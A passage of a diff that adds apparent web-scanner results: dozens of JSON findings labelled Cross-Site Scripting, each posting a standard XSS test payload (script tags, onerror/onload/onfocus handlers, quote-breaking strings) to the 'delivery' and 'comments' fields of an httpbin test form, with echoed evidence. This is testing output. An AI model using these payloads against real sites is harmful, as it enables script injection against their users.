+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<iframe src=javascript:alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<body onload=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"132\", \n    \"Content-Type\": \"applicati",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<video><source onerror=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<audio src=x onerror=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<details open ontoggle=alert('XSS')>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"';alert('XSS');//\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\\\";alert('XSS');//\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"</script><script>alert('XSS')</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"139\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"152\", \n    \"Content-Type\"",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<script>alert(/XSS/)</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<script>alert`XSS`</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"118\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "delivery",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"<script>alert(1)</script>\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<script>alert('XSS')</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<img src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<img src=x onerror=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"125\", \n    \"Content-Type\": \"application/x-www-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<svg onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<svg onload=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"116\", \n    \"Content-Type\": \"application/x-www-form-ur",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "javascript:alert('XSS')",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"javascript:alert('XSS')\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"110\", \n    \"Content-Type\": \"application/x-www-form-urle",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<iframe src=javascript:alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<iframe src=javascript:alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<body onload=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<body onload=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"117\", \n    \"Content-Type\": \"application/x-www-form-u",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<input onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<input onfocus=alert('XSS') autofocus>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"129\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<select onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<select onfocus=alert('XSS') autofocus>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<textarea onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<textarea onfocus=alert('XSS') autofocus>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"132\", \n    \"Content-Type\": \"applicati",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<keygen onfocus=alert('XSS') autofocus>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<keygen onfocus=alert('XSS') autofocus>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"130\", \n    \"Content-Type\": \"application",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<video><source onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<video><source onerror=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"131\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<audio src=x onerror=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<audio src=x onerror=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-ww",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<details open ontoggle=alert('XSS')>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<details open ontoggle=alert('XSS')>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"127\", \n    \"Content-Type\": \"application/x-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "';alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"';alert('XSS');//\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencoded",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "\";alert('XSS');//",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"\\\";alert('XSS');//\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"112\", \n    \"Content-Type\": \"application/x-www-form-urlencode",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "</script><script>alert('XSS')</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"</script><script>alert('XSS')</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"139\", \n    \"Content-Type\": \"application/",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<script>alert(String.fromCharCode(88,83,83))</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<script>alert(String.fromCharCode(88,83,83))</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"152\", \n    \"Content-Type\"",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<script>alert(/XSS/)</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<script>alert(/XSS/)</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"124\", \n    \"Content-Type\": \"application/x-www-for",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<script>alert`XSS`</script>",
+      "method": "POST",
+      "evidence": "{\n  \"args\": {}, \n  \"data\": \"\", \n  \"files\": {}, \n  \"form\": {\n    \"comments\": \"<script>alert`XSS`</script>\", \n    \"custemail\": \"\", \n    \"custname\": \"\", \n    \"custtel\": \"\", \n    \"delivery\": \"\", \n    \"size\": \"large\", \n    \"topping\": \"mushroom\"\n  }, \n  \"headers\": {\n    \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\", \n    \"Accept-Encoding\": \"gzip, deflate\", \n    \"Accept-Language\": \"en-US,en;q=0.5\", \n    \"Content-Length\": \"118\", \n    \"Content-Type\": \"application/x-www-form-",
+      "status_code": 200
+    },
+    {
+      "type": "Cross-Site Scripting (XSS)",
+      "url": "https://httpbin.org/post",
+      "parameter": "comments",
+      "payload": "<script>alert(1)</script>",
+      "method": "POST",
